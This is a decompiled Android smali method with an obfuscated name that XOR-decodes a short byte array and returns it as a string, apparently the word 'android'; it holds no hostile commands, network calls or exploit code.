.method public static yieCh1ie6ool6eiw()Ljava/lang/String;
    .registers 11

    const/16 v0, 0x11

    .line 1
    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, -0x18

    aput-byte v2, v0, v1

    const/4 v3, 0x1

    const/16 v4, -0x4d

    aput-byte v4, v0, v3

    const/4 v4, 0x2

    const/16 v5, -0xa

    aput-byte v5, v0, v4

    const/4 v4, 0x3

    const/16 v5, 0x29

    aput-byte v5, v0, v4

    const/4 v4, 0x4

    const/16 v5, 0x23

    aput-byte v5, v0, v4

    const/4 v4, 0x5

    const/16 v5, 0x62

    aput-byte v5, v0, v4

    const/4 v4, 0x6

    const/4 v5, -0x8

    aput-byte v5, v0, v4

    const/16 v4, -0x42

    const/4 v5, 0x7

    aput-byte v4, v0, v5

    const/16 v4, -0x7c

    const/16 v6, 0x8

    aput-byte v4, v0, v6

    const/16 v4, 0x9

    const/16 v7, -0x7d

    aput-byte v7, v0, v4

    const/16 v4, 0xa

    const/16 v7, 0x59

    aput-byte v7, v0, v4

    const/16 v4, 0xb

    const/16 v7, -0x76

    aput-byte v7, v0, v4

    const/16 v4, 0xc

    const/16 v7, 0x3f

    aput-byte v7, v0, v4

    const/16 v4, 0xd

    const/16 v7, -0x64

    aput-byte v7, v0, v4

    const/16 v4, 0xe

    const/16 v7, 0x78

    aput-byte v7, v0, v4

    const/16 v4, 0xf

    aput-byte v2, v0, v4

    const/16 v2, -0x7a

    const/16 v7, 0x10

    aput-byte v2, v0, v7

    new-array v2, v7, [B

    fill-array-data v2, :array_88

    const/16 v8, 0x8

    :goto_66
    if-ge v8, v4, :cond_75

    add-int/lit8 v9, v8, -0x8

    rem-int/2addr v9, v7

    aget-byte v10, v0, v8

    aget-byte v9, v2, v9

    xor-int/2addr v9, v10

    int-to-byte v9, v9

    aput-byte v9, v0, v8

    add-int/2addr v8, v3

    goto :goto_66

    :cond_75
    new-array v2, v5, [B

    :goto_77
    if-ge v1, v5, :cond_81

    add-int v4, v6, v1

    aget-byte v4, v0, v4

    aput-byte v4, v2, v1

    add-int/2addr v1, v3

    goto :goto_77

    :cond_81
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    return-object v0

    nop

    :array_88
    .array-data 1
        -0x1bt
        -0x13t
        0x3dt
        -0x8t
        0x50t
        -0xbt
        0x1ct
        -0x6at
        -0x2dt
        0x77t
        -0x60t
        0x31t
        0x33t
        0x20t
        -0x7dt
        -0x3et
    .end array-data
.end method
